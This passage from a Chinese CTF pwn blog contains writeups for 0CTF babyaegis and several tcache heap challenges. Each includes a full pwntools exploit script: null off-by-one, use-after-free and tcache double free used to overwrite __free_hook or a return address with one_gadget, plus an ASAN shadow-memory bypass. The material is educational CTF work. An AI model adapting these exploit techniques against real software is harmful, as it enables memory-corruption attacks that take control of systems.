is equal to // SizeClassMap::kMaxSize and the actual size is stored in the // SecondaryAllocator's metadata. u32 user_requested_size : 29; // align &lt; 8 -&gt; 0 // else -&gt; log2(min(align, 512)) - 2 u32 user_requested_alignment_log : 3; u32 alloc_context_id;&#125;; ChunkHeader前8bit存了chunk_state ，后24bit存了 alloc_tid ，以此类推。可以发现ChunkHeader中存有 user_requested_size字段，尝试修改这个字段，可以发现如果将这修改为一个很大的值的话，释放掉chunk就会使 shadow memory 回到初始状态，具体的机制我没看源码了解的就不是很多，看别人的writeup说是内存过大，触发了asan的回收机制。 123456pwndbg&gt; x/10gx 0xc047fff80000xc047fff8000: 0xfafafa00fafafafa 0xfafafafafafafafa0xc047fff8010: 0xfafafafafafafafa 0xfafafafafafafafa0xc047fff8020: 0xfafafafafafafafa 0xfafafafafafafafa0xc047fff8030: 0xfafafafafafafafa 0xfafafafafafafafa0xc047fff8040: 0xfafafafafafafafa 0xfafafafafafafafa 这时再新建一个note，会发现新分配的note和之前分配的note重叠，并且顺序是相反的。所以我们可以控制note中的内存指针，从而实现任意读写，利用这个先泄露出code_base， 然后泄露got表内容获取libc地址。 此时note和堆的情况 123456789101112pwndbg&gt; x/10gx 0x5633cc75fcc00x5633cc75fcc0 &lt;notes&gt;: 0x0000602000000030 0x00006020000000100x5633cc75fcd0 &lt;notes+16&gt;: 0x0000000000000000 0x00000000000000000x5633cc75fce0 &lt;notes+32&gt;: 0x0000000000000000 0x00000000000000000x5633cc75fcf0 &lt;notes+48&gt;: 0x0000000000000000 0x00000000000000000x5633cc75fd00 &lt;notes+64&gt;: 0x0000000000000000 0x0000000000000000pwndbg&gt; x/10gx 0x00006020000000000x602000000000: 0x02ffffff00000002 0x4d000001200000100x602000000010: 0x0000602000000030 0x00005633cb8c3ab00x602000000020: 0x02ffffff00000002 0x30800001200000100x602000000030: 0x0000602000000018 0xbe000000000000000x602000000040: 0x0000000000000000 0x0000000000000000 getshell 两种思路，一种是改写_ZN11__sanitizerL15UserDieCallbackE为one_gadeget ，另一种是改写update中的read_until_nl_or_max函数的返回地址。通过libc中的 __enviorn变量，泄露出栈地址，然后将read_until_nl_or_max函数的返回地址改为one_gadget。 改写call_back为one_gadget这里通过覆盖bss段上的_ZN11__sanitizerL15UserDieCallbackE为one_gadget，然后造成内存错误时就会被执行。这能成功的原因是UserDieCallback函数会调用在 bss段上的_ZN11__sanitizerL15UserDieCallbackE所指的函数。 调用链 12345 _asan_handle_no_return(v17, v10, v12, v16, v13, v14);_ubsan_handle_cfi_check_fail_abort(&amp;unk_34B100, v18, v19, v20, v21, v22); if ( __sanitizer::UserDieCallback ) __sanitizer::UserDieCallback(this); v2 = &amp;__sanitizer::InternalDieCallbacks; __sanitizer::UserDieCallback(this)会去调用bss段上的_ZN11__sanitizerL15UserDieCallbackE，所以只要将_ZN11__sanitizerL15UserDieCallbackE覆盖为one_gadget,触发内存错误时就可以getshell了。 改写read_until_nl_or_max的返回地址先泄露出stack的地址，泄露方法和之前的一样，然后将read_until_nl_or_max函数的返回地址修改为one_gadget，read_until_nl_or_max返回时就可以getshell了。 调试计算出read_until_nl_or_max的返回地址和泄露出来stack的地址之间的偏移 但是发现直接覆盖为one_gadget不行, 这里通过覆盖返回地址为gets函数，将栈的内容清空满足one_gadget的条件 exp11234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677from pwn import*context.log_level = "debug"host = '111.186.63.209'port = 6666#p = process('./aegis')p = remote(host,port)elf = ELF('./aegis')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def add(idx,size,content): p.sendlineafter("Choice: ",'1') p.sendlineafter(":",str(size)) p.sendafter(":",content) p.sendlineafter(":",str(idx)) def show(idx): p.sendlineafter(":",'2') p.sendlineafter(":",str(idx)) def update(idx,content,new_idx): p.sendlineafter(":",'3') p.sendlineafter(": ",str(idx)) p.sendafter(":",content) p.sendlineafter(":",str(new_idx)) def delete(idx): p.sendlineafter(":",'4') p.sendlineafter(":",str(idx))def secret(add): p.sendlineafter(":",'666') p.sendlineafter(":",str(add)) def get_base(): text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[4], 16) print hex(text_base) return text_base#note_add = get_base() + 0xFB0CC0#d = 0x113954 +get_base() #gdb.attach(p,'b *&#123;&#125;'.format(hex(d)))#success(hex(note_add))add(0x123456789abcdef,0x10,'a'*0x8)secret(str(0xc047fff8004))update(0,'a'*0x12,0x123456789)update(0,'a'*0x10 + p64(0x02ffffff00000002)[:7] ,0x01f000000002ff)delete(0)add(0,0x10,p64(0x602000000018))show(0)p.recvuntil("Content: ")leak_code = u64(p.recv(6).ljust(8,'\x00'))code_base = leak_code - 0x114ab0success(hex(code_base))puts_got = elf.got['puts']update(1,p64(code_base + puts_got)[:2],(code_base+puts_got)&gt;&gt;8) #leak libcshow(0)p.recvuntil("Content: ")leak_libc = u64(p.recv(6).ljust(8,'\x00'))libc_base = leak_libc - libc.symbols['puts']libc.address = libc_basesuccess(hex(libc_base))one_gadget = libc_base+0x10a38ccall_back = code_base + 0xFB0888update(1,p64(call_back)[:7],0) # overwrite cfg ==&gt; null ,trigger memory errorpause()update(0,' '*8,one_gadget) #overwrite call_back ==&gt; one_gadgetp.interactive("zs0zrc&gt;&gt;") exp21234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889from pwn import*context.log_level = "debug"host = '111.186.63.209'port = 6666#p = process('./aegis')p = remote(host,port)elf = ELF('./aegis')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def add(idx,size,content): p.sendlineafter("Choice: ",'1') p.sendlineafter(":",str(size)) p.sendafter(":",content) p.sendlineafter(":",str(idx)) def show(idx): p.sendlineafter(":",'2') p.sendlineafter(":",str(idx)) def update(idx,content,new_idx): p.sendlineafter(":",'3') p.sendlineafter(": ",str(idx)) p.sendafter(":",content) p.sendlineafter(":",str(new_idx)) def delete(idx): p.sendlineafter(":",'4') p.sendlineafter(":",str(idx))def secret(add): p.sendlineafter(":",'666') p.sendlineafter(":",str(add)) def get_base(): text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[4], 16) print hex(text_base) return text_base'''ru_add1 = 0x1146E0 + get_base()ru_add2 = 0x1140D0 + get_base()note_add = get_base() + 0xFB0CC0success(hex(note_add))'''add(0x123456789abcdef,0x10,'a'*0x8)secret(str(0xc047fff8004))update(0,'a'*0x12,0x123456789)update(0,'a'*0x10 + p64(0x02ffffff00000002)[:7] ,0x01f000000002ff)delete(0)add(0,0x10,p64(0x602000000018))show(0)p.recvuntil("Content: ")leak_code = u64(p.recv(6).ljust(8,'\x00'))code_base = leak_code - 0x114ab0success(hex(code_base))puts_got = elf.got['puts']update(1,p64(code_base + puts_got)[:2],(code_base+puts_got)&gt;&gt;8) #leak libcshow(0)p.recvuntil("Content: ")leak_libc = u64(p.recv(6).ljust(8,'\x00'))libc_base = leak_libc - libc.symbols['puts']libc.address = libc_basesuccess(hex(libc_base))one_gadget = libc_base+0x10a38ccall_back = code_base + 0xFB0888update(1,p64(libc.symbols['__environ'])[:7],0) show(0)p.recvuntil("Content: ")stack_add = u64(p.recv(6).ljust(8,'\x00'))success(hex(stack_add))ret = stack_add - 0x150update(1,p64(ret)[:7],0)sleep(0.1)p.sendline("3")sleep(0.1)p.sendline('0')sleep(0.1)p.send(p64(libc.symbols['gets'])[:7])# overwrite ret ==&gt; getsp.sendline('a'*0x2 + p64(one_gadget) + '\x00'*0x100)#rop and clear stackp.interactive("zs0zrc&gt;&gt;") 总结这道题最主要的难点在于ASAN这个防护，要想办法去绕过它。还有就是要静下心来调试，通过这道题学了很多新东西，很赞的一道题。 Reference https://www.anquanke.com/post/id/175401 https://ray-cp.github.io/archivers/0CTF_2019_PWN_WRITEUP http://lordofpwn.kr/index.php/2019/03/28/0ctf-2019-zerotask-writeup/ https://balsn.tw/ctf_writeup/20190323-0ctf_tctf2019quals/#babyaegis https://www.anquanke.com/post/id/175556#h2-8 https://ray-cp.github.io/archivers/0CTF_2019_PWN_WRITEUP https://github.com/scwuaptx/CTF/blob/master/2019-writeup/0ctf/babyaegis.py]]></content>
      <categories>
        <category>CTF&#39;s writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[tcache下的几道pwn题]]></title>
    <url>%2F2019%2F03%2F18%2F2019-3-18-tcache%E4%B8%8B%E7%9A%84%E5%87%A0%E9%81%93pwn%E9%A2%98%2F</url>
    <content type="text"><![CDATA[最近在刷题，这里做几道跟tcache机制相关的题目。 下载地址 LCTF2018 easy_heap防护机制： 1234567☁ easy_heap checksec easy_heap [*] &apos;/home/zs0zrc/pwn/tcache/easy_heap/easy_heap&apos; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled 程序很简单，一共有三个功能 1231.malloc2.free3.put 漏洞在malloc功能里 1234567891011121314151617181920212223242526272829303132333435unsigned __int64 create()&#123; __int64 v0; // rbx __int64 v2; // [rsp+0h] [rbp-20h] int v3; // [rsp+0h] [rbp-20h] unsigned int size; // [rsp+4h] [rbp-1Ch] unsigned __int64 v5; // [rsp+8h] [rbp-18h] v5 = __readfsqword(0x28u); LODWORD(v2) = 0; while ( v2 &lt;= 9 &amp;&amp; *(0x10LL * v2 + buf) ) LODWORD(v2) = v2 + 1; if ( v2 == 10 ) &#123; puts("full!"); &#125; else &#123; v0 = buf; *(v0 + 16LL * v2) = malloc(0xF8uLL); if ( !*(16LL * v2 + buf) ) &#123; puts("malloc error!"); exits(); &#125; printf("size \n&gt; ", v2); size = read_int(); if ( size &gt; 0xF8 ) exits(); *(16LL * v3 + buf + 8) = size; printf("content \n&gt; "); read_content(*(16LL * v3 + buf), *(16LL * v3 + buf + 8)); &#125; return __readfsqword(0x28u) ^ v5;&#125; 这里在读content时有一个null offbyone漏洞 12345678910111213141516171819202122232425unsigned __int64 __fastcall read_content(_BYTE *buf, int size)&#123; unsigned int v3; // [rsp+14h] [rbp-Ch] unsigned __int64 v4; // [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u); v3 = 0; if ( size ) &#123; while ( 1 ) &#123; read(0, &amp;buf[v3], 1uLL); if ( size - 1 &lt; v3 || !buf[v3] || buf[v3] == 10 ) break; ++v3; &#125; buf[v3] = 0; // null offbyone buf[size] = 0; &#125; else &#123; *buf = 0; &#125; return __readfsqword(0x28u) ^ v4;&#125; 利用思路： 程序存在null offbyone漏洞，libc版本是2.27，存在tcache机制。所以先free7个chunk将tcache填满，之后的chunk就会进入unsorted bin中。然后利用null offbyone在free时触发unlink向前合并，就可以泄露出libc地址。最后利用tcache_dup，分配包含_free_hook的chunk，向__free_hook中写入one_gadget来getshell。 exp： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879from pwn import*context.log_level = "debug"context.terminal = ['tmux', 'splitw', '-h']target = './easy_heap'p = process(target)libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def new(size,data): p.recv() p.sendline("1") p.recvuntil("&gt; ") p.sendline(str(size)) p.recvuntil("&gt; ") p.sendline(data)def free(idx): p.recv() p.sendline("2") p.recvuntil("&gt; ") p.sendline(str(idx))def put(idx): p.recv() p.sendline("3") p.recvuntil("&gt; ") p.sendline(str(idx))for i in range(10): new(0x20,"\n") free(1) # 6free(3) # 5for i in range(5,10): free(i) free(0)free(2)free(4)for i in range(7): new(0x20,"\n") new(0x20,"\n") #chunk_7new(0xf8,"\n") #chunk_8 null offbyone chunk_5for i in range(5): free(i)free(6) #fill tcachefree(5) #unlink , put into unsorted binput(8)leak = u64(p.recv(8)[0:6].ljust(8,'\x00'))libc_base = leak - libc.symbols['__malloc_hook'] - 0x10 - 88libc.address= libc_basefree_hook = libc.symbols['__free_hook']one_gadget = 0xfccde + libc_baselog.info("libc_base &#123;&#125;".format(hex(libc_base)))for i in range(7): new(0x20,"\n") new(0x20,"\n") #chunk_9 和 chunk_8 指向同一个地址free(0) #确保后面可以分配三个chunkfree(8) free(9) #double freenew(0x20,p64(free_hook))new(0x20,"\n")new(0x20,p64(one_gadget))free(1)p.interactive() hitcon2018 children_tcache防护机制： 12345678☁ public checksec children_tcache [*] &apos;/home/zs0zrc/pwn/tcache/children_tcache/public/children_tcache&apos; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled FORTIFY: Enabled 程序漏洞点在new heap功能里 12345678910111213141516171819202122232425262728293031323334unsigned __int64 create()&#123; signed int i; // [rsp+Ch] [rbp-2034h] char *dest; // [rsp+10h] [rbp-2030h] unsigned __int64 size; // [rsp+18h] [rbp-2028h] char s; // [rsp+20h] [rbp-2020h] unsigned __int64 v5; // [rsp+2038h] [rbp-8h] v5 = __readfsqword(0x28u); memset(&amp;s, 0, 0x2010uLL); for ( i = 0; ; ++i ) &#123; if ( i &gt; 9 ) &#123; puts(":("); return __readfsqword(0x28u) ^ v5; &#125; if ( !chunk_add[i] ) break; &#125; printf("Size:"); size = read_int(); if ( size &gt; 0x2000 ) exit(-2); dest = malloc(size); if ( !dest ) exit(-1); printf("Data:"); read_data(&amp;s, size); strcpy(dest, &amp;s); // null offbyone chunk_add[i] = dest; chunk_size[i] = size; return __readfsqword(0x28u) ^ v5;&#125; 这里存在一个null offbyOne 漏洞。原因是strcpy复制字符串时会将null字节一起复制。这里malloc可以分配大小在0x2000以下的chunk，最多分配十个。这一题比较简单。 利用思路： 因为可以控制分配的chunk的大小，所以可以分配大小超过0x400的chunk，这超出了tcache的范围，所以不会被放入tcache中。构造好堆的布局，两个大小大于0x400的chunk中间要夹着一个在tcache范围的chunk。假设这三个chunk分别为chunk1、2、3。先free掉chunk1，然后通过chunk2利用null offbyOne 将chunk3的prev_size和prev_inuse清空。然后将chunk3的prev_size字段设为 chunk1+chunk2的size的和，free掉chunk3。就会触发unlink向前合并，合并后的chunk会加入unsorted bin中，这时分配一个大小为chunk1的chunk，则会从合并的chunk中分割出来，并且向chunk2中写如unsorted bin的地址，通过chunk2就可以泄露出libc地址。最后利用tcache_dup 往__free_hook里写入one_gadget来getshell。具体的看代码。 exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263from pwn import*context.log_level = "debug"context.terminal = ['tmux', 'splitw', '-h']p = process('./children_tcache')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def new(size,content): p.recv() p.sendline("1") p.recvuntil(":") p.sendline(str(size)) p.recvuntil(":") p.sendline(content) def free(idx): p.recv() p.sendline("3") p.recvuntil(":") p.sendline(str(idx)) def put(idx): p.recv() p.sendline("2") p.recvuntil(":") p.sendline(str(idx)) new(0x410,"a")new(0x28,"a"*0x28)new(0x5f0,"a")new(0x20,"a") #gap top chunkfree(0)free(1)#clear chunk_2 prev_size and prev_inusefor i in range(9): new(0x28-i,"a"*(0x28-i)) free(0) new(0x28,"a"*0x20 + p64(0x420+0x30)) #0free(2) #trigger unlinknew(0x410,"a") #1 malloc(0x410) then unsorted add will write in 0put(0) leak = u64(p.recv(8)[:6].ljust(8,'\x00')) libc_base = leak - libc.symbols['__malloc_hook'] - 0x10 - 88libc.address = libc_basefree_hook = libc.symbols['__free_hook']one_gadget = 0xfccde + libc_baselog.info("libc_base &#123;&#125;".format(hex(libc_base)))new(0x28,"\n") #2free(0)free(2)new(0x28,p64(free_hook))new(0x28,"\n")new(0x28,p64(one_gadget))free(1)p.interactive() hitbxctf2018 gundam防护机制： 1234567☁ gumdam checksec gundam [*] &apos;/home/zs0zrc/pwn/tcache/gumdam/gundam&apos; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled 这一道题比前面两道都要简单一点，程序主要功能有4个 12341.build_gundam2.visit3.destory4.blow up the factory 漏洞出现在destory功能中，它将chunk释放后没有将相应的指针清空，导致了UAF。 123456789101112131415161718192021222324__int64 destory()&#123; unsigned int v1; // [rsp+4h] [rbp-Ch] unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); if ( count ) &#123; printf("Which gundam do you want to Destory:"); __isoc99_scanf("%d", &amp;v1); if ( v1 &gt; 8 || !array[v1] ) &#123; puts("Invalid choice"); return 0LL; &#125; *array[v1] = 0; // UAF free(*(array[v1] + 8LL)); &#125; else &#123; puts("No gundam"); &#125; return 0LL;&#125; 利用思路： 先利用visit功能泄露出libc地址。泄露地址前要先将tcache填满，不然chunk不会进入unsorted bin中。泄露出libc地址后可以用tcache_dup，往_free_hook中写入one_gadget。具体的细节看exp。 exp： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172from pwn import*context.log_level = "debug"context.terminal = ['tmux', 'splitw', '-h']target = './gundam'p = process(target)libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def build(name,type): p.recv() p.sendline("1") p.recv() p.send(name) p.recv() p.sendline(str(type)) def visit(): p.recvuntil("Your choice : ") p.sendline("2") def destory(idx): p.recv() p.sendline("3") p.recv() p.sendline(str(idx)) def blow_up(): p.recvuntil("Your choice : ") p.sendline("4") for i in range(9): build("aaaa",1) for i in range(2,9): destory(i)destory(0) #unsorteddestory(1)blow_up()for i in range(7): build("aaaa",1)build("bbbbbbbb",1) #7build("aaaaaaaa",1) #8visit()p.recvuntil("bbbbbbbb")leak = u64(p.recv(8)[:6].ljust(8,'\x00'))log.info("leak ==&gt;&#123;&#125;".format(hex(leak)))libc_base = leak - 0x3dac78libc.address = libc_basefree_hook = libc.symbols['__free_hook']one_gadget = 0xfccde + libc_baselog.info("libc_base ==&gt; &#123;&#125;".format(hex(libc_base)))destory(6) #为了后面tcache_dup可以分配三个chunk，所以要释放掉两个chunkdestory(5)destory(7)destory(7) #double freeblow_up()build(p64(free_hook),1) #tcache_dupbuild("aaaa",1)build(p64(one_gadget),1)destory(0)p.interactive() CodegateCTF2019 god-the-reum防护机制： 1234567☁ god-the-reum checksec god-the-reum [*] &apos;/home/zs0zrc/pwn/tcache/god-the-reum/god-the-reum&apos; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled 简单的逆了下，主要看main、create、withdraw还有那个developer的功能 main： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; int v3; // ST18_4 int v4; // ST18_4 int v6; // ST18_4 char array[88]; // [rsp+20h] [rbp-60h] unsigned __int64 v8; // [rsp+78h] [rbp-8h] __int64 savedregs; // [rsp+80h] [rbp+0h] v8 = __readfsqword(0x28u); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 2, 0LL); while ( 1 ) &#123; menu(); while ( getchar() != 10 ) ; switch ( &amp;savedregs ) &#123; case 1u: create(&amp;array[16 * count]); break; case 2u: v3 = get_idx(); deposit(&amp;array[16 * v3]); break; case 3u: v4 = get_idx(); withdraw(&amp;array[16 * v4]); break; case 4u: show(array, 0LL); break; case 5u: puts("bye da."); return 0LL; case 6u: v6 = get_idx(); sub_1092(&amp;array[16 * v6]); break; default: sub_11B3(); break; &#125; &#125;&#125; 它用一个char数组来存储分配的wallet。每个wallet包含一个随机生成的add 和 一个用来存储eth的chunk。 create函数： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546unsigned __int64 __fastcall create(void **a1)&#123; char *v1; // rax unsigned int v2; // eax char v4; // [rsp+13h] [rbp-1Dh] char v5; // [rsp+13h] [rbp-1Dh] signed int i; // [rsp+14h] [rbp-1Ch] size_t size; // [rsp+18h] [rbp-18h] void *s; // [rsp+20h] [rbp-10h] unsigned __int64 v9; // [rsp+28h] [rbp-8h] v9 = __readfsqword(0x28u); s = malloc(0x82uLL); //用于存储随机生生成的addr if ( !s || count &gt; 4 ) //最多分配4个wallet &#123; puts("wallet creation failed"); exit(0); &#125; memset(s, 0, 0x82uLL); v1 = s + strlen(s); *v1 = 30768; v1[2] = 0; v2 = time(0LL); srand(v2); for ( i = 0; i &lt;= 39; ++i ) //利用rand随机生成addr &#123; v4 = rand() % 15; if ( v4 &gt; 9 ) v5 = rand() % 6 + 97; else v5 = v4 + 48; *(s + i + 2) = v5; &#125; *a1 = s; printf("how much initial eth? : ", 0LL); __isoc99_scanf("%llu", &amp;size); a1[1] = malloc(size); //存储eth的chunk大小没有限制 if ( a1[1] ) *a1[1] = size; ++count; sub_119B(); puts("Creating new wallet succcess !\n"); sub_FD5(*a1, a1[1]); putchar(10); return __readfsqword(0x28u) ^ v9;&#125; withdraw功能： 1234567891011121314unsigned __int64 __fastcall withdraw(__int64 a1)&#123; __int64 v2; // [rsp+10h] [rbp-10h] unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf("how much you wanna withdraw? : "); __isoc99_scanf("%llu", &amp;v2); **(a1 + 8) -= v2; //将wallet的eth减少 if ( !**(a1 + 8) ) //如果wallet的eth为0，就将它的chunk释放掉 free(*(a1 + 8)); // 这里存在UAF，因为它没检查chunk是否释放过了 puts("withdraw ok !\n"); return __readfsqword(0x28u) ^ v3;&#125; developer功能: 123456789__int64 __fastcall developer(__int64 a1)&#123; sub_119B(); puts("this menu is only for developer"); puts("if you are not developer, please get out"); sleep(1u); printf("new eth : "); return __isoc99_scanf("%10s", *(a1 + 8)); // 修改wallet的eth，可以通过这个来修改被释放的wallet的fd指针&#125; 利用思路： 先分配一个大于tcache范围的wallet，利用它来泄露出libc地址。然后利用tcache_dup修改_free_hook 为one_gadget。这里的tcache_dup可以利用developer功能，直接修改tcache_chunk的fd指针。 exp: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576from pwn import*context.log_level = "debug"context.terminal = ['tmux', 'splitw', '-h']target = './god-the-reum'p = process(target)libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def create(eth): p.recv() p.sendline("1") p.recv() p.sendline(str(eth)) def deposit(idx,eth): p.recv() p.sendline("2") p.recv() p.sendline(str(idx)) #p.recv() p.sendline(str(eth)) def withdraw(idx,eth): p.recv() p.sendline("3") p.recv() p.sendline(str(idx)) p.recv() p.sendline(str(eth)) def show(): p.recv() p.sendline("4") def cheth(idx,eth): p.recv() p.sendline("6") p.recv() p.sendline(str(idx)) p.recv() p.sendline(str(eth)) create(0x500)#0create(0x80)#1withdraw(0,0x500)#free 0show()p.recvuntil("ballance")leak = int(p.recv(16),10)libc_base = leak - libc.symbols['__malloc_hook'] - 0x10 - 88libc.address = libc_basefree_hook = libc.symbols['__free_hook']one_gadget = 0xfccde + libc_baselog.info("libc_base ==&gt; &#123;&#125;".format(hex(libc_base)))log.info("free_hook ==&gt; &#123;&#125;".format(hex(free_hook)))withdraw(1,0x80)cheth(1,p64(free_hook)) #change fdcreate(0x80)#2 free_hookp.recv()p.sendline("6")p.recv()p.sendline("2")p.recv()p.sendline(p64(one_gadget)) #write free_hookcreate(0x80)#3withdraw(3,0x80)p.interactive() hitcon2018 baby_tcache防护机制： 12345678☁ baby_tcache checksec baby_tcache [*] &apos;/home/zs0zrc/pwn/tcache/baby_tcache/baby_tcache&apos; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled FORTIFY: Enabled 漏洞点： 1234567891011121314151617181920212223242526272829303132int create()&#123; _QWORD *v0; // rax signed int i; // [rsp+Ch] [rbp-14h] _BYTE *v3; // [rsp+10h] [rbp-10h] unsigned __int64 size; // [rsp+18h] [rbp-8h] for ( i = 0; ; ++i ) &#123; if ( i &gt; 9 ) &#123; LODWORD(v0) = puts(":("); return (signed int)v0; &#125; if ( !chunk_add[i] ) break; &#125; printf("Size:"); size = sub_B27(); if ( size &gt; 0x2000 ) exit(-2); v3 = malloc(size); if ( !v3 ) exit(-1); printf("Data:"); sub_B88((__int64)v3, size); v3[size] = 0; // nulL offbyOne chunk_add[i] = v3; v0 = chunk_size; chunk_size[i] = size; return (signed int)v0;&#125; 这道题的漏洞点和children_tcache一样，具体的做法和children_tcache差不多，都是通过null offbyOne漏洞 构造overlapping chunk。但是这题少了输出功能，所以要想办法泄露libc。这里泄露libc的涉及到了IO_FILE的利用，通过修改 puts函数工作过程中stdout 结构体中的 _IO_write_base ，来达到泄露libc地址信息的目的。 简单的分析下puts函数的函数调用链 puts函数在源码中是由 _IO_puts实现的，而 _IO_puts 函数内部会调用 _IO_sputn，结果会执行 _IO_new_file_xsputn,最终会执行 _IO_overflow _IO_puts源码： 12345678910111213141516int_IO_puts (const char *str)&#123; int result = EOF; _IO_size_t len = strlen (str); _IO_acquire_lock (_IO_stdout); if ((_IO_vtable_offset (_IO_stdout) != 0 || _IO_fwide (_IO_stdout, -1) == -1) &amp;&amp; _IO_sputn (_IO_stdout, str, len) == len &amp;&amp; _IO_putc_unlocked ('\n', _IO_stdout) != EOF) result = MIN (INT_MAX, len + 1); _IO_release_lock (_IO_stdout); return result;&#125; _IO_new_file_overflow 12345678910111213141516171819202122232425262728int_IO_new_file_overflow (_IO_FILE *f, int ch)&#123; if (f-&gt;_flags &amp; _IO_NO_WRITES) /* SET ERROR */ &#123; f-&gt;_flags |= _IO_ERR_SEEN; __set_errno (EBADF); return EOF; &#125; /* If currently reading or no buffer allocated. */ if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;_IO_write_base == NULL) ...... ...... &#125; if (ch == EOF) return _IO_do_write (f, f-&gt;_IO_write_base, f-&gt;_IO_write_ptr - f-&gt;_IO_write_base); //目标 if (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) /* Buffer is really full */ if (_IO_do_flush (f) == EOF) return EOF; *f-&gt;_IO_write_ptr++ = ch; if ((f-&gt;_flags &amp; _IO_UNBUFFERED) || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == '\n')) if (_IO_do_write (f, f-&gt;_IO_write_base, f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF) return EOF; return (unsigned char) ch;&#125; 可以发现_IO_do_write是最后调用的函数， 而 _IO_write_base 是我们要修改的目标。这里f-&gt; _flags &amp; _IO_NO_WRITES的值应该是0，同时使 f-&gt; _flags &amp; _IO_CURRENTLY_PUTTING 的值为1，避免执行不必要的代码。 _IO_do_write函数的参数为stdout结构体、 _IO_write_base 和要打印的size。而 _IO_do_write实际会调用 new_do_write，参数一样。 12345678910111213141516171819202122232425static_IO_size_tnew_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)&#123; _IO_size_t count; if (fp-&gt;_flags &amp; _IO_IS_APPENDING) fp-&gt;_offset = _IO_pos_BAD; else if (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base) &#123; _IO_off64_t new_pos = _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, 1); if (new_pos == _IO_pos_BAD) return 0; fp-&gt;_offset = new_pos; &#125; count = _IO_SYSWRITE (fp, data, to_do); //最终输出 if (fp-&gt;_cur_column &amp;&amp; count) fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - 1, data, count) + 1; _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base); fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base; fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= 0 &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED)) ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end); return count;&#125; 其中_IO_SYSWRITE 就是我们的目标，这相当于 write(fp , data, to_do)。 _IO_SYSSEEK只是简单的调用lseek，但是我们不能完全控制fp-&gt; _IO_write_base - fp-&gt; _IO_read_end 的值。如果 fp-&gt; _IO_read_end的值设为0,那么 _IO_SYSSEEK的第二个参数的值就会过大。如果设置fp-&gt; _IO_write_base = fp-&gt; _IO_read_end 的话，那么在其他地方就会有问题，因为fp-&gt; _IO_write_base 不能大于fp-&gt; _IO_write_end 。所以这里要 设置fp- _flags | _IO_IS_APPENDING，避免进入else if分支中。 IO_FILE 的flags标志的一些宏 12345678910111213141516171819202122#define _IO_MAGIC 0xFBAD0000 /* Magic number */#define _IO_MAGIC_MASK 0xFFFF0000#define _IO_USER_BUF 0x0001 /* Don't deallocate buffer on close. */#define _IO_UNBUFFERED 0x0002#define _IO_NO_READS 0x0004 /* Reading not allowed. */#define _IO_NO_WRITES 0x0008 /* Writing not allowed. */#define _IO_EOF_SEEN 0x0010#define _IO_ERR_SEEN 0x0020#define _IO_DELETE_DONT_CLOSE 0x0040 /* Don't call close(_fileno) on close. */#define _IO_LINKED 0x0080 /* In the list of all open files. */#define _IO_IN_BACKUP 0x0100#define _IO_LINE_BUF 0x0200#define _IO_TIED_PUT_GET 0x0400 /* Put and get pointer move in unison. */#define _IO_CURRENTLY_PUTTING 0x0800#define _IO_IS_APPENDING 0x1000#define _IO_IS_FILEBUF 0x2000 /* 0x4000 No longer used, reserved for compat. */#define _IO_USER_LOCK 0x8000_flags=_IO_MAGIC+_IO_CURRENTLY_PUTTING+_IO_IS_APPENDING+（_IO_LINKED）_flags=0xfbad1800 or 0xfbad1880 或者再加一些其他不影响leak的_flags _flag的构造满足的条件: 1234_flags = 0xfbad0000 _flags &amp; = ~_IO_NO_WRITES // _flags = 0xfbad0000_flags | = _IO_CURRENTLY_PUTTING // _flags = 0xfbad0800_flags | = _IO_IS_APPENDING // _flags = 0xfbad1800 IO_FILE的部分就差不多这么多了，下面要解决怎么劫持stdout的问题。 劫持stdout利用的是null 